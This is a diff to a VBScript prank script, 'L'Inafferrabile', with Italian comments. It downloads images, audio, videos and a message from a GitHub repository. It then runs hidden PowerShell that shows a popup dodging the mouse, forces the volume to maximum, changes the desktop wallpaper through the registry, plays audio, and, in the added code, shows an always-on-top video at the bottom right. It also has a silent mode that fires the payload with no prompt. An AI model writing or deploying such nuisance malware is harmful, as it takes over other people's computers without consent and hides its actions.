@@ -1,5 +1,5 @@
 ' =========================================================
-' SCRIPT "L'INAFFERRABILE" - FULL DYNAMIC VERSION (FIXED)
+' SCRIPT "L'INAFFERRABILE" - POPUP VIDEO BOTTOM-RIGHT
 ' =========================================================
 Option Explicit 
 On Error Resume Next 
@@ -9,7 +9,7 @@ Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject") 
 
 ' --- CONFIGURAZIONE --- 
-Dim urlI1, urlI2, urlI3, urlA1, urlA2, urlA3, urlMsg, msgWeb
+Dim urlI1, urlI2, urlI3, urlA1, urlA2, urlA3, urlV1, urlV2, urlV3, urlMsg, msgWeb
 Dim s1, s2, s3, scappa, mostraPopup
 
 ' 1 = Il popup scappa dal mouse, 0 = Fermo al centro
@@ -34,6 +34,9 @@ urlI3 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagi
 urlA1 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/audio1.mp3" 
 urlA2 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/audio2.mp3" 
 urlA3 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/audio3.mp3" 
+urlV1 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/video1.mp4"
+urlV2 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/video2.mp4"
+urlV3 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/video3.mp4"
 urlMsg = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/messaggio.txt?v=" & ts
 
 ' --- PERCORSI TEMPORANEI ---
@@ -44,12 +47,15 @@ Dim pA3: pA3 = tD & "\a3_" & randomID & ".mp3"
 Dim pI1: pI1 = tD & "\i1_" & randomID & ".jpg"
 Dim pI2: pI2 = tD & "\i2_" & randomID & ".jpg"
 Dim pI3: pI3 = tD & "\i3_" & randomID & ".jpg"
+Dim pV1: pV1 = tD & "\v1_" & randomID & ".mp4"
+Dim pV2: pV2 = tD & "\v2_" & randomID & ".mp4"
+Dim pV3: pV3 = tD & "\v3_" & randomID & ".mp4"
 Dim psS : psS = tD & "\ui_" & randomID & ".ps1"
 
 ' --- 1. DOWNLOAD RISORSE ---
-Scarica urlA1, pA1 : Scarica urlI1, pI1
-Scarica urlA2, pA2 : Scarica urlI2, pI2
-Scarica urlA3, pA3 : Scarica urlI3, pI3
+Scarica urlA1, pA1 : Scarica urlI1, pI1 : Scarica urlV1, pV1
+Scarica urlA2, pA2 : Scarica urlI2, pI2 : Scarica urlV2, pV2
+Scarica urlA3, pA3 : Scarica urlI3, pI3 : Scarica urlV3, pV3
 
 ' Recupero messaggio dinamico dal web
 Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0") 
@@ -73,11 +79,11 @@ If mostraPopup = 1 Then
             "$dX = $fC.X - $m.X; $dY = $fC.Y - $m.Y; " & _
             "$dist = [Math]::Sqrt($dX*$dX + $dY*$dY); " & _
             "if ($dist -lt 150) { " & _
-            "   $v=35; $nX=$f.Left+($dX/$dist)*$v; $nY=$f.Top+($dY/$dist)*$v; " & _
-            "   $s=[Windows.Forms.Screen]::PrimaryScreen.Bounds; " & _
-            "   if($nX -lt 0){$nX=0}; if($nX+$f.Width -gt $s.Width){$nX=$s.Width-$f.Width}; " & _
-            "   if($nY -lt 0){$nY=0}; if($nY+$f.Height -gt $s.Height){$nY=$s.Height-$f.Height}; " & _
-            "   $f.Location = New-Object Drawing.Point($nX, $nY); " & _
+            "    $v=35; $nX=$f.Left+($dX/$dist)*$v; $nY=$f.Top+($dY/$dist)*$v; " & _
+            "    $s=[Windows.Forms.Screen]::PrimaryScreen.Bounds; " & _
+            "    if($nX -lt 0){$nX=0}; if($nX+$f.Width -gt $s.Width){$nX=$s.Width-$f.Width}; " & _
+            "    if($nY -lt 0){$nY=0}; if($nY+$f.Height -gt $s.Height){$nY=$s.Height-$f.Height}; " & _
+            "    $f.Location = New-Object Drawing.Point($nX, $nY); " & _
             "} }); $f.Add_Shown({$timer.Start()});" & vbCrLf
     Else
         c = c & "$f.StartPosition = 'CenterScreen';" & vbCrLf
@@ -106,12 +112,11 @@ If mostraPopup = 1 Then
 End If
 
 ' --- 3. ESECUZIONE ---
-' Alza il volume al massimo (Chr(&hAF) è il tasto Volume Up)
+' Alza il volume al massimo
 Dim i
 For i = 1 To 50: shell.SendKeys Chr(&hAF): Next 
 
 If mostraPopup = 1 Then
-    ' Crea ed esegue il file PowerShell temporaneo per la UI
     Set fS = fso.CreateTextFile(psS, True)
     fS.Write c
     fS.Close
@@ -120,15 +125,13 @@ If mostraPopup = 1 Then
     
     If fso.FileExists(psS) Then fso.DeleteFile(psS)
 
-    ' Azione finale basata sull'Exit Code restituito da PowerShell
     Select Case exitCode
-        Case 1: AzioneFinale pA1, pI1
-        Case 2: AzioneFinale pA2, pI2
-        Case 3: AzioneFinale pA3, pI3
+        Case 1: AzioneFinale pA1, pI1, pV1
+        Case 2: AzioneFinale pA2, pI2, pV2
+        Case 3: AzioneFinale pA3, pI3, pV3
     End Select
 Else
-    ' Esecuzione Automatica del primo payload senza mostrare nulla
-    AzioneFinale pA1, pI1
+    AzioneFinale pA1, pI1, pV1
 End If
 
 ' --- FUNZIONI ---
@@ -138,8 +141,8 @@ Sub Scarica(u, p)
     End If
 End Sub
 
-Sub AzioneFinale(audioPath, imagePath)
-    ' 1. Cambio Wallpaper tramite Registro e API User32
+Sub AzioneFinale(audioPath, imagePath, videoPath)
+    ' 1. Cambio Wallpaper
     If fso.FileExists(imagePath) Then
         Dim psWall
         psWall = "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value '" & imagePath & "'; " & _
@@ -149,7 +152,10 @@ Sub AzioneFinale(audioPath, imagePath)
         shell.Run "powershell -WindowStyle Hidden -Command """ & psWall & """", 0, True
     End If
 
-    ' 2. Riproduzione Audio (30 secondi)
+    ' 2. Esecuzione Video in basso a destra
+    AzioneVideo videoPath
+
+    ' 3. Riproduzione Audio (Background)
     If fso.FileExists(audioPath) Then
         Dim psAudio
         psAudio = "Add-Type -AssemblyName PresentationCore; " & _
@@ -161,4 +167,20 @@ Sub AzioneFinale(audioPath, imagePath)
     End If
 End Sub
 
-
+Sub AzioneVideo(vPath)
+    If fso.FileExists(vPath) Then
+        Dim psVid
+        ' Calcolo dinamico della posizione: Bottom-Right
+        psVid = "Add-Type -AssemblyName System.Windows.Forms, PresentationFramework, PresentationCore, WindowsFormsIntegration; " & _
+                "$f = New-Object Windows.Forms.Form; $f.Text='VID'; $f.FormBorderStyle='None'; $f.Size='480,270'; " & _
+                "$screen = [Windows.Forms.Screen]::PrimaryScreen.WorkingArea; " & _
+                "$x = $screen.Width - $f.Width; $y = $screen.Height - $f.Height; " & _
+                "$f.Location = New-Object Drawing.Point($x, $y); $f.StartPosition='Manual'; " & _
+                "$f.TopMost=$true; $f.BackColor='Black'; " & _
+                "$el = New-Object System.Windows.Controls.MediaElement; $el.Source='" & vPath & "'; $el.LoadedBehavior='Play'; " & _
+                "$h = New-Object Windows.Forms.Integration.ElementHost; $h.Dock='Fill'; $h.Child=$el; " & _
+                "$f.Controls.Add($h); $f.ShowDialog();"
+        
+        shell.Run "powershell -WindowStyle Hidden -Command """ & psVid & """", 0, False
+    End If
+End Sub
